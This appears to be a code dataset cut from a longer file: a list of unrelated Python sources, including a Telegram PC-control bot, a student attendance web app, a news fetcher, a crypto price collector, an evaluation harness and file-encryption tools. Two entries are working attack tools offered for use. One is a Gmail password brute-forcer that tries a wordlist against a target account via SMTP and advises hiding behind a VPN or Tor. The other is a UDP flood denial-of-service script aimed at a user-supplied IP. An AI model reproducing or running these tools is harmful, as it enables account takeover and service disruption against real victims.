\u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d.\")\n    \n@app.on_message(filters.command(\"connet\", prefixes=\".\"))\ndef ipconfig_command(client, message):\n    # Execute the 'ipconfig' command and decode the output from cp866 encoding to Unicode\n    ipconfig_output = subprocess.check_output(\"ipconfig\", shell=True).decode(\"cp866\")\n    \n    # Create a formatted version of the IP configuration output\n    formatted_output = \"\"\"\n\u2699\ufe0f Network Configuration:\n\n{}\n\"\"\".format(ipconfig_output).strip()\n\n    if message.reply_to_message:\n        # Edit the original message with the formatted output\n        client.edit_message_text(\n            chat_id=message.chat.id,\n            message_id=message.reply_to_message.message_id,\n            text=formatted_output\n        )\n    else:\n        # Send a new message with the formatted output\n        sent_message = client.send_message(\n            chat_id=message.chat.id,\n            text=formatted_output\n        )\n    \n@app.on_message(filters.command(\"res\", prefixes=\".\"))\ndef reboot_pc(client, message):\n    os.system(\"shutdown /r /t 0\")\n    client.edit_message_text(message.chat.id, message.message_id, \"\u041a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440 \u0431\u0443\u0434\u0435\u0442 \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d.\")  \n        \n@app.on_message(filters.command(\"leto\", prefixes=\".\"))\ndef count_down_to_summer(client, message: Message):\n    summer_date = datetime(datetime.now().year, 6, 1, 0, 0, 0, tzinfo=pytz.utc)  # \u0412\u0440\u0435\u043c\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u043b\u0435\u0442\u0430 \u0441 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0435\u0439 \u043e \u0441\u043c\u0435\u0449\u0435\u043d\u0438\u0438 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0437\u043e\u043d\u044b (UTC)\n    \n    if datetime.now(tz=pytz.utc) > summer_date:\n        summer_date",
    "from fastapi import FastAPI, File, HTTPException, Request, Form, UploadFile\nfrom fastapi.responses import HTMLResponse\nfrom fastapi.templating import Jinja2Templates\nfrom firebase_admin import credentials, db, storage\nimport numpy as np\nimport time\nimport firebase_admin\nimport uvicorn\nimport base64\nfrom fastapi.responses import JSONResponse\nimport subprocess\nimport json\nimport datetime\nimport cv2\nfrom functions import encodegenerator, adddatatodatabase\nfrom data import data\n\n# Initialize Firebase\ncred = credentials.Certificate(\"../serviceAccountKey.json\")\nfirebase_admin.initialize_app(cred, {\n    'databaseURL': \"https://face-recog-196bc-default-rtdb.firebaseio.com/\",\n    'storageBucket': \"face-recog-196bc.appspot.com\"\n})\nbucket = storage.bucket()\n\nIMAGEDIR =  \"../Image/\"\napp = FastAPI()\ntemplates = Jinja2Templates(directory=\"templates\")\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def read_item(request: Request):\n    students_ref = db.reference('Student')\n    students = students_ref.get()\n    student_data = []\n\n    for student_id, data in students.items():\n        student_info = {\n            'id': student_id,\n            'name': data['name'],\n            'major': data['major'],\n            'year': data['year'],\n            'total_attendance': data['total_attendance'],\n            'attendance_times': data.get('attendance_times', [])  # Get attendance times or empty list if not available\n        }\n        # Fetch image from Firebase Storage and convert to base64\n        blob = bucket.blob(f'Image/{student_id}.png')\n        img_data = blob.download_as_string()\n        img_base64 = base64.b64encode(img_data).decode('utf-8')\n        student_info['image'] = img_base64\n        student_data.append(student_info)\n\n    return templates.TemplateResponse(\"dashboard.html\", {\"request\": request, \"students\": student_data})\n\n@app.get(\"/attendance_times/{student_id}\", response_class=HTMLResponse)\nasync def get_attendance_times(request: Request, student_id: str):\n    student_ref = db.reference(f'Student/{student_id}')\n    student_data = student_ref.get()\n    if not student_data:\n        raise HTTPException(status_code=404, detail=\"Student not found\")\n    \n    # Retrieve student information\n    student_name = student_data.get('name', '')\n    student_major = student_data.get('major', '')\n    student_year = student_data.get('year', '')\n    \n    # Retrieve attendance times\n    attendance_times = student_data.get('attendance_times', [])\n    \n    # Fetch image from Firebase Storage and convert to base64\n    blob = bucket.blob(f'Image/{student_id}.png')\n    img_data = blob.download_as_string()\n    student_image = base64.b64encode(img_data).decode('utf-8')\n\n    return templates.TemplateResponse(\"attendance_times.html\", \n                                      {\"request\": request, \n                                       \"student_id\": student_id, \n                                       \"student_name\": student_name, \n                                       \"student_major\": student_major,\n                                       \"student_year\": student_year,\n                                       \"student_image\": student_image,\n                                       \"attendance_times\": attendance_times})\n\n@app.get(\"/register\", response_class=HTMLResponse)\nasync def read_item(request: Request):\n    return templates.TemplateResponse(\"registration_form.html\", {\"request\": request})\n\n\n@app.post(\"/register_form\")\nasync def register_student(request: Request, name: str = Form(...), major: str = Form(...), \n                           starting_year: int = Form(...), last_attendance_time: str = Form(...),\n                            file: UploadFile = File(...)\n                           ):\n    contents = await file.read()\n    with open(f\"{IMAGEDIR}{file.filename}\", \"wb\") as f:\n        f.write(contents)\n    # Save form data to a JSON file\n    a = file.filename[:-4]\n    new_data = {\n        a: {\n            \"name\": name,\n            \"major\": major,\n            \"starting_year\": starting_year,\n            \"total_attendance\": 0,\n            \"year\": datetime.datetime.now().year - starting_year + 1,\n            \"REGISTERED_ON\": datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n            \"last_attendance_time\": last_attendance_time\n        }\n    }\n    add_item(new_data)\n\n    # encodegenerator()\n    # adddatatodatabase(new_data)\n\n    return {\"message\": \"Please go to /last_page\"}\n\n\n@app.get(\"/last_page\" ,response_class=HTMLResponse)\nasync def read_item(request: Request):\n    return templates.TemplateResponse(\"last_page.html\", {\"request\": request})\n\n\n@app.post(\"/run_python_files\")\nasync def run_python_files():\n    try:\n        adddatatodatabase()\n        encodegenerator()\n        \n        \n        return {\"message\": \"Please go back to Dashboard to see the changes\"}\n    except Exception as e:\n        return {\"error\": f\"An error occurred: {str(e)}\"}\n\n\ndef add_item(new_data):\n    with open('data.py', 'r') as f:\n        lines = f.readlines()\n\n    if lines",
    "import urequests\nimport gc\n\ndef get_latest_news(api_token, country):\n    \n    url= f'https://newsapi.org/v2/top-headlines?country={country}&pageSize=6&apiKey={api_token}'\n    \n    gc.collect()\n    headers = {\n    'User-Agent': 'eInkDisplay'\n    }\n    \n    response = None\n    \n    try:\n        response = urequests.get(url, headers=headers)\n        print(response.json())\n        if response.status_code == 200:\n            data = response.json()  # Konvertiert die Antwort in ein Python-Diktat\n            articles = data.get('articles', [])  # Holt das 'articles' Array aus der Antwort\n\n            # Extrahiert die Titel der ersten f\u00fcnf Nachrichtenartikel\n            titles = [article.get('title', 'Kein Titel verfuegbar') for article in articles[:6]]\n            return titles\n        else:\n            print('Fehler bei der Anfrage:', response.status_code)\n            titles = ['Kein Titel verfuegbar' for _ in range(5)]\n            return titles\n    except OSError as e:\n        print(f\"Ein Fehler ist aufgetreten: {e}\")\n        titles = ['Kein Titel verfuegbar' for _ in range(5)]\n        return titles\n    finally:\n        # Die Verbindung schlie\u00dfen, wenn sie ge\u00f6ffnet wurde\n        if response is not None:\n            try:\n                response.close()\n            except AttributeError:\n                pass  # Falls response.close() fehlschl\u00e4gt, nichts tun",
    "# Periodically download BTC and ETH 1MIN Klines data using Binance API and save it to a dolphindb database\n\nimport requests\nimport json\nimport time\nimport dolphindb as ddb\nimport pandas as pd\nimport datetime\nimport schedule\nimport os\nfrom binance.client import Client\nfrom DingDingBot.DDBOT import DingDing\nimport time\nimport hmac\nimport hashlib\nimport base64\nimport urllib.parse\nimport retrying\nimport pytz\n\n\nclass BinanceTools:\n\n    @staticmethod\n    def create_bot():\n        \"\"\"\n        Creates a DingDing bot with the specified webhook.\n\n        Returns:\n            DingDing: An instance of the DingDing class representing the bot.\n\n        Raises:\n            KeyError: If the required environment variables (DINGDING_ACCESS_TOKEN and DINGDING_SECRET) are not set.\n        \"\"\"\n        # Initialize DingDing bot with webhook\n        timestamp = str(round(time.time() * 1000))\n        try:\n            access_token = os.environ[\"DINGDING_ACCESS_TOKEN\"]\n            secret = os.environ[\"DINGDING_SECRET\"]\n            webhook_prefix = (\n                f\"https://oapi.dingtalk.com/robot/send?access_token={access_token}\"\n            )\n            secret_enc = secret.encode(\"utf-8\")\n            string_to_sign = \"{}\\n{}\".format(timestamp, secret)\n            string_to_sign_enc = string_to_sign.encode(\"utf-8\")\n            hmac_code = hmac.new(\n                secret_enc, string_to_sign_enc, digestmod=hashlib.sha256\n            ).digest()\n            sign = urllib.parse.quote_plus(base64.b64encode(hmac_code))\n\n            webhook = f\"{webhook_prefix}&timestamp={timestamp}&sign={sign}\"\n            return DingDing(webhook=webhook)\n        except KeyError:\n            raise KeyError(\n                \"DINGDING_ACCESS_TOKEN and DINGDING_SECRET environment variables must be set.\"\n            )\n\n    @staticmethod\n    @retrying.retry(wait_random_min=1000, wait_random_max=3000)\n    def create_binance_client():\n        \"\"\"\n        Creates a Binance client object using the provided API key and secret.\n\n        Returns:\n            Binance client object: An instance of the Binance client.\n\n        Raises:\n            KeyError: If the BINANCE_API_KEY or BINANCE_API_SECRET environment variables are not set.\n        \"\"\"\n        try:\n            api_key = os.environ[\"BINANCE_API_KEY\"]\n            api_secret = os.environ[\"BINANCE_API_SECRET\"]\n            proxies = {\"https\": \"127.0.0.1:7890\"}\n            client = Client(api_key, api_secret, {\"proxies\": proxies})\n            return client\n        except KeyError:\n            print(\n                \"BINANCE_API_KEY and BINANCE_API_SECRET environment variables must be set.\"\n            )\n            raise KeyError(\n                \"BINANCE_API_KEY and BINANCE_API_SECRET environment variables must be set.\"\n            )\n\n    @staticmethod\n    def create_ddb_client():\n        \"\"\"\n        Creates and returns a DDB client.\n\n        Returns:\n            DDB client: A client object for interacting with DDB.\n        \"\"\"\n        s = ddb.session()\n        s.connect(\"localhost\", 8902, \"admin\", \"123456\")\n        return s\n\n    @staticmethod\n    # create database and table\n    def create_db_database_and_table():\n        \"\"\"\n        Creates a database and table in the DDB (DolphinDB) database.\n\n        This function connects to the DDB server, creates a database with two sub-databases,\n        and creates a partitioned table within the database.\n\n        Returns:\n            None\n        \"\"\"\n        # s = ddb.session()\n        # s.connect(\"localhost\", 8902, \"admin\", \"123456\")\n        # s.run(\"dbPath = 'dfs://crypto_kline'\")\n        # s.run(\"tableName = 'kline_1min'\")\n        # s.run(\"if(existsDatabase(dbPath)){dropDatabase(dbPath)}\")\n        # s.run('db1 = database(\"\", VALUE, 2020.01.01..2024.12.31)')\n        # s.run('db2 = database(\"\", HASH,[SYMBOL,3])')\n        # s.run(\"db = database(dbPath,COMPO, [db1,db2], engine = 'TSDB')\")\n        # s.run(\n        #     \"t = table(1:0, `open_time`open`high`low`close`volume`close_time`quote_asset_volume`number_of_trades`taker_buy_base_asset_volume`taker_buy_quote_asset_volume`symbol, [TIMESTAMP, DOUBLE, DOUBLE, DOUBLE, DOUBLE, DOUBLE, TIMESTAMP, DOUBLE, INT, DOUBLE, DOUBLE, SYMBOL])\"\n        # )\n        # s.run(\n        #     f\"db.createPartitionedTable(t, tableName, `open_time`symbol, sortColumns = `symbol`open_time, keepDuplicates = LAST)\"\n        # )\n        pass\n\n    @staticmethod\n    def insert_data(ddb_session, data, db_path, table_name):\n        \"\"\"\n        Inserts data into DolphinDB database table.\n\n        Args:\n            ddb_session (DolphinDBSession): The DolphinDB session object.\n            data (pd.DataFrame): The data to be inserted into the table.\n            db_path (str): The path of the database.\n            table_name (str): The name of the table.\n\n        Raises:\n            Exception: If there is an error inserting data into DolphinDB.\n\n        \"\"\"\n        try:\n            ddb_session.run(f\"t = loadTable('{db_path}', '{table_name}')\")\n            ",
    "import hw1_3;\n\ndef test_hw1_3():\n    print(hw1_3.hw1_3() == \"2 * 2 = 4\\n2 * 3 = 6\\n2 * 4 = 8\\n2 * 5 = 10\\n2 * 6 = 12\\n2 * 7 = 14\\n2 * 8 = 16\\n2 * 9 = 18\\n==\\n3 * 2 = 6\\n3 * 3 = 9\\n3 * 4 = 12\\n3 * 5 = 15\\n3 * 6 = 18\\n3 * 7 = 21\\n3 * 8 = 24\\n3 * 9 = 27\\n==\\n4 * 2 = 8\\n4 * 3 = 12\\n4 * 4 = 16\\n4 * 5 = 20\\n4 * 6 = 24\\n4 * 7 = 28\\n4 * 8 = 32\\n4 * 9 = 36\\n==\\n5 * 2 = 10\\n5 * 3 = 15\\n5 * 4 = 20\\n5 * 5 = 25\\n5 * 6 = 30\\n5 * 7 = 35\\n5 * 8 = 40\\n5 * 9 = 45\\n==\\n6 * 2 = 12\\n6 * 3 = 18\\n6 * 4 = 24\\n6 * 5 = 30\\n6 * 6 = 36\\n6 * 7 = 42\\n6 * 8 = 48\\n6 * 9 = 54\\n==\\n7 * 2 = 14\\n7 * 3 = 21\\n7 * 4 = 28\\n7 * 5 = 35\\n7 * 6 = 42\\n7 * 7 = 49\\n7 * 8 = 56\\n7 * 9 = 63\\n==\\n8 * 2 = 16\\n8 * 3 = 24\\n8 * 4 = 32\\n8 * 5 = 40\\n8 * 6 = 48\\n8 * 7 = 56\\n8 * 8 = 64\\n8 * 9 = 72\\n==\\n9 * 2 = 18\\n9 * 3 = 27\\n9 * 4 = 36\\n9 * 5 = 45\\n9 * 6 = 54\\n9 * 7 = 63\\n9 * 8 = 72\\n9 * 9 = 81\\n\")\n    assert hw1_3.hw1_3() == \"2 * 2 = 4\\n2 * 3 = 6\\n2 * 4 = 8\\n2 * 5 = 10\\n2 * 6 = 12\\n2 * 7 = 14\\n2 * 8 = 16\\n2 * 9 = 18\\n==\\n3 * 2 = 6\\n3 * 3 = 9\\n3 * 4 = 12\\n3 * 5 = 15\\n3 * 6 = 18\\n3 * 7 = 21\\n3 * 8 = 24\\n3 * 9 = 27\\n==\\n4 * 2 = 8\\n4 * 3 = 12\\n4 * 4 = 16\\n4 * 5 = 20\\n4 * 6 = 24\\n4 * 7 = 28\\n4 * 8 = 32\\n4 * 9 = 36\\n==\\n5 * 2 = 10\\n5 * 3 = 15\\n5 * 4 = 20\\n5 * 5 = 25\\n5 * 6 = 30\\n5 * 7 = 35\\n5 * 8 = 40\\n5 * 9 = 45\\n==\\n6 * 2 = 12\\n6 * 3 = 18\\n6 * 4 = 24\\n6 * 5 = 30\\n6 * 6 = 36\\n6 * 7 = 42\\n6 * 8 = 48\\n6 * 9 = 54\\n==\\n7 * 2 = 14\\n7 * 3 = 21\\n7 * 4 = 28\\n7 * 5 = 35\\n7 * 6 = 42\\n7 * 7 = 49\\n7 * 8 = 56\\n7 * 9 = 63\\n==\\n8 * 2 = 16\\n8 * 3 = 24\\n8 * 4 = 32\\n8 * 5 = 40\\n8 * 6 = 48\\n8 * 7 = 56\\n8 * 8 = 64\\n8 * 9 = 72\\n==\\n9 * 2 = 18\\n9 * 3 = 27\\n9 * 4 = 36\\n9 * 5 = 45\\n9 * 6 = 54\\n9 * 7 = 63\\n9 * 8 = 72\\n9 * 9 = 81\\n\"\n    \ntest_hw1_3()",
    "# *  Author  : hackise\n# *  GitHub  : https://github.com/hackise\n# *  YouTub  : ediop3 hacking\n# *  License : MIT\n\nimport smtplib, sys, os, random\nfrom os import system\n\nOKGREEN = '\\033[92m'\nWARNING = '\\033[0;33m'\nFAIL = '\\033[91m'\nENDC = '\\033[0m'\nLITBU = '\\033[94m'\nYELLOW = '\\033[3;33m'\nCYAN = '\\033[0;36'\ncolors = ['\\033[92m', '\\033[91m', '\\033[0;33m']\nRAND = random.choice(colors)\n\nGMAIL_PORT = '587'\n\n\n# AKASH BANER\ndef artwork():\n    print(\"\\n\")\n    print('''\\033[32m\n      \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2557              \n     \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d  \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551            \n     \u2588\u2588\u2551  \u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551   \n     \u2588\u2588\u2551   \u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551            \n     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551 \u2588\u2588\u2551  \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557       \n      \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u255d     \u255a\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d  v2.1  \n \u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \n \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\n \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\n \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d        \n\u26a0\ufe0fWARNING:I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !\n*******************************************************\n* Author   : hackise\n* GitHub   : https://github.com/hackise\n* YouTub   : ediop3 hacking\n* password : passworld.txt\n*************USE VPN OR TOR SERVICE********************\n''')\nartwork()\nsmtp = smtplib.SMTP(\"smtp.gmail.com\", GMAIL_PORT)\n\nsmtp.ehlo()\nsmtp.starttls()\n\nuser = input(\"While The Target Gmail Adress: \")\npwd = input(\"Enter '0' to use the inbuilt passwords list \\nEnter '1' to Add a custom password list\\nOptions: \")\n\nif pwd == '0':\n    passswfile = \"passworld.txt\"\n\nelif pwd == '1':\n    print(\"\\n\")\n    passswfile = input(\"Name The File Path (For Password List):\")\n\nelse:\n    print(\"\\n\")\n    print(\"Invalid input! Terminaling...\")\n    sys.exit(1)\ntry:\n    passswfile = open(passswfile, \"r\")\n\nexcept Exception as e:\n    print(e)\n    sys.exit(1)\n\nfor password in passswfile:\n    try:\n        smtp.login(user, password)\n\n        print(\"[+] Password Found %s\" % password)\n        break\n\n    except smtplib.SMTPAuthenticationError:\n        print(\"[-] Pasword Is Wrong. %s \" % password)\n        # Author  : beluga (ediop3 squad) (ediop3 hacking) (hackise)\n        #thank you hackers\n",
    "# Copyright 2024-present Kensho Technologies, LLC.\n\"\"\"\nThis is a modified version of the \"safe\" python execution code from the\nHumanEval repo:\nhttps://github.com/openai/human-eval/blob/master/human_eval/execution.py\n\nThey release their version under the MIT License:\n\nThe MIT License\n\nCopyright (c) OpenAI (https://openai.com)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n\"\"\"\n\nfrom typing import Optional, Dict\nimport ast\nimport contextlib\nimport faulthandler\nimport io\nimport os\nimport multiprocessing\nimport platform\nimport signal\nimport tempfile\n\n\ndef unsafe_execute(code, result, timeout):\n    with create_tempdir():\n        # These system calls are needed when cleaning up tempdir.\n        import os\n        import shutil\n\n        rmtree = shutil.rmtree\n        rmdir = os.rmdir\n        chdir = os.chdir\n\n        # Disable functionalities that can make destructive changes to the test.\n        reliability_guard()\n\n        return_val = None\n        failure_reason = None\n        try:\n            exec_globals = {}\n            with swallow_io():\n                with time_limit(timeout):\n                    # WARNING\n                    # This program exists to execute untrusted model-generated code. Although\n                    # it is highly unlikely that model-generated code will do something overtly\n                    # malicious in response to this test suite, model-generated code may act\n                    # destructively due to a lack of model capability or alignment.\n                    # Users are strongly encouraged to sandbox this evaluation suite so that it\n                    # does not perform destructive actions on their host or network. For more\n                    # information on how OpenAI sandboxes its code, see the accompanying paper.\n                    # Once you have read this disclaimer and taken appropriate precautions,\n                    # uncomment the following line and proceed at your own risk:\n\n                    # This is the main modification from the base HumanEval\n                    block = ast.parse(code, mode=\"exec\")\n                    last = ast.Expression(block.body.pop().value)\n\n                    # Set these equal to allow for list comprehension\n                    fake_globals = {}\n                    fake_locals = fake_globals\n\n                    print(\"Going\")\n                    exec(\n                        compile(block, \"<string>\", mode=\"exec\"),\n                        fake_globals,\n                        fake_locals,\n                    )\n                    return_val = eval(\n                        compile(last, \"<string>\", mode=\"eval\"),\n                        fake_globals,\n                        fake_locals,\n                    )\n                    print(return_val)\n        except TimeoutException:\n            return_val = None\n            failure_reason = \"timeout\"\n        except BaseException as e:\n            return_val = None\n            failure_reason = str(e)\n\n        result.append(return_val)\n        result.append(failure_reason)\n\n        # Needed for cleaning up.\n        shutil.rmtree = rmtree\n        os.rmdir = rmdir\n        os.chdir = chdir\n\n\ndef exec_python(code: str, timeout: float = 1.0) -> Dict:\n    \"\"\"\n    Executes python code and returns the result, if any, and the reason the\n    code failed (timeout or error), if any. The return value is an implicit\n    return on whatever the last line of code is. So,\n    >>> x = 1\n    >>> y = 2\n    >>> x + y\n\n    would return 3.\n    \"\"\"\n    ctx = multiprocessing.get_context(\"fork\")\n    manager = multiprocessing.Manager()\n    result = manager.list()\n\n    p = ctx.Process(target=unsafe_execute, args=(code, result, timeout))\n\n    p.start()\n\n    p.join(timeout=timeout + 1)\n    if p.is_alive():\n        p.kill()\n\n    if not result:\n        result.append(\"timed out\")\n\n    if len(result) == 2:\n        return_val = result[0]\n        failure_reason = result[1]\n    else:\n        return_val = None\n        failure_reason = \"Failed to parse?\"\n\n    return dict(\n",
    "#!/usr/bin/python3\n\n# module for file manipulation\nimport os\n\n# to manipulate JSON file\nimport json\n\n# module for TextIO handle\nimport sys\n\n# user-defined cryptophic tool module\nimport crypto_func\n\n# module to handle command-line argument\nimport argparse\n\nparser = argparse.ArgumentParser(\n    description='Encrypt a file using AES algorithm , key using RSA algorithm.',\n    epilog='Made with love by Quoc Bao & Chau Long!'\n)\n\nparser.add_argument('infile',\n    type=argparse.FileType('rb'),\n    help='File path of plaintext file.'\n)\n\nparser.add_argument( \"-k\", \"--kprivatefile\",\n    nargs='?',\n    type=argparse.FileType('wb'),\n    # To write or read binary data from/to the standard streams\n    default=sys.stdout.buffer,                \n    help='File path of new file to store the Kprivate key. If not specified, the standard output stream is used.',\n)\n\nparser.add_argument( \"-o\", \"--output\",\n    nargs='?',\n    type=argparse.FileType('wb'),\n    # To write or read binary data from/to the standard streams\n    default=sys.stdout.buffer,\n    help='Desired file path for the decrypted file. If not specified, the standard output stream is used.'\n)\n\nargs = parser.parse_args()\n\n# --- subsection a + b. ---\n\n# Ks private key generation \nKsKey = crypto_func.generateKeyAES()\n\n# Encrypt the provided file using AES\n# Store the encrypted file\ncrypto_func.encrypt_file_aes(args.infile, args.output, KsKey)\n\n# --- subsection c. ---\n\n# Generation of Kprivate and Kpublic using RSA\nKprivate, Kpublic = crypto_func.generateRSAKey()\n\n# encrypt Ks using Kpublic\nKxkey = crypto_func.encryptRSA(KsKey, Kpublic)\n\n# --- subsection d. ---\n# write Kx to file, along with it SHA-1 as hex format to prevent conversion like UTF-8\nHKprivate = json.dumps({'Kx':Kxkey.hex(), 'SHA-1':crypto_func.SHA1(Kprivate).hex()})\n\nwith open(\"metadata/{}.metadata\".format(os.path.basename(sys.argv[1])), 'wb') as file:\n    file.write(HKprivate.encode())\n\nif args.kprivatefile == sys.stdout.buffer:\n    print(\"KPrivate key:\")\nargs.kprivatefile.write(Kprivate._key.export_key())\n\n\nargs.infile.close()\nargs.kprivatefile.close()\nargs.output.close()",
    "import logging\nimport os\nfrom typing import Optional\n\nfrom pip._vendor.pyproject_hooks import BuildBackendHookCaller\n\nfrom pip._internal.utils.subprocess import runner_with_spinner_message\n\nlogger = logging.getLogger(__name__)\n\n\ndef build_wheel_pep517(\n    name: str,\n    backend: BuildBackendHookCaller,\n    metadata_directory: str,\n    tempd: str,\n) -> Optional[str]:\n    \"\"\"Build one InstallRequirement using the PEP 517 build process.\n\n    Returns path to wheel if successfully built. Otherwise, returns None.\n    \"\"\"\n    assert metadata_directory is not None\n    try:\n        logger.debug(\"Destination directory: %s\", tempd)\n\n        runner = runner_with_spinner_message(\n            f\"Building wheel for {name} (pyproject.toml)\"\n        )\n        with backend.subprocess_runner(runner):\n            wheel_name = backend.build_wheel(\n                tempd,\n                metadata_directory=metadata_directory,\n            )\n    except Exception:\n        logger.error(\"Failed building wheel for %s\", name)\n        return None\n    return os.path.join(tempd, wheel_name)\n",
    "print (\"\\033[91m\")\nimport sys\nimport os\nimport time\nimport socket\nimport random\n#Code Time\nfrom datetime import datetime\nnow = datetime.now()\nhour = now.hour\nminute = now.minute\nday = now.day\nmonth = now.month\nyear = now.year\n\n##############\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbytes = random._urandom(1490)\n#############\n\nos.system(\"clear\")\nos.system(\"figlet XI-DDoS\")\nprint\nprint \"Coded By : Mr.XI\"\nprint \"Author   : LEADER XI\"\nprint \"Github   : github.com/LeaderXI\"\nprint \"Telegram : https://telegram.me/F5_JUBA\"\nprint \"FG- Qalabkani Waa Aalad Sharci Ah Waxaana Loogu Tala Galay Waxbarasho uun Kaliyah. Wixii Kaloo ka imaado Waa Madaxaaga!\"\nprint\nip = raw_input(\"IP Target : \")\nport = input(\"Port       : \")\nos.system(\"clear\")\nprint(\"\\033[93m\")\nos.system(\"figlet DdoS Attack\")\nprint(\"Team : LeaderXI\")\nprint (\"\\033[92m\")\nprint \"[                    ] 0% \"\ntime.sleep(5)\nprint \"[=====               ] 25%\"\ntime.sleep(5)\nprint \"[==========          ] 50%\"\ntime.sleep(5)\nprint \"[===============     ] 75%\"\ntime.sleep(5)\nprint \"[====================] 100%\"\ntime.sleep(3)\nsent = 0\nwhile True:\n     sock.sendto(bytes, (ip,port))\n     sent = sent + 1\n     port = port + 1\n     print \"Sent %s packet to %s throught port:%s\"%(sent,ip,port)\n     if port == 65534:\n       port = 1\n\n",
    "from botcity.web import WebBot, Browser, By\nfrom webdriver_manager.chrome import ChromeDriverManager\nimport pandas as pd\n\nclass MyWebBot(WebBot):\n    \n    \n    def action(self, execution=None):\n        email_gestta = ' '\n        password_gestta = ' '\n        email_sieg = ' '\n        password_sieg = ' '\n        filepath = r'C:\\Users\\davi.inov\\Desktop\\Projetos\\Departamento_AEC\\04_cadrasto_sieg\\data\\BASE DE DADOS DE CLIENTES ATIVOS.xlsx'\n        \n        self.configure()\n\n        df = pd.read_excel(filepath)\n        print('Arquivo excel lido com sucesso')\n        \n        if 'PROCESSADO' not in df.columns:\n            df['PROCESSADO'] = df.duplicated('CNPJ', keep='first')\n            df.to_excel(filepath, index=False)\n            \n        contador_gestta = 0\n        contador_sieg = 0\n        for index, row in df.iterrows():\n            try:\n                process = row['PROCESSADO']\n                if process or process == 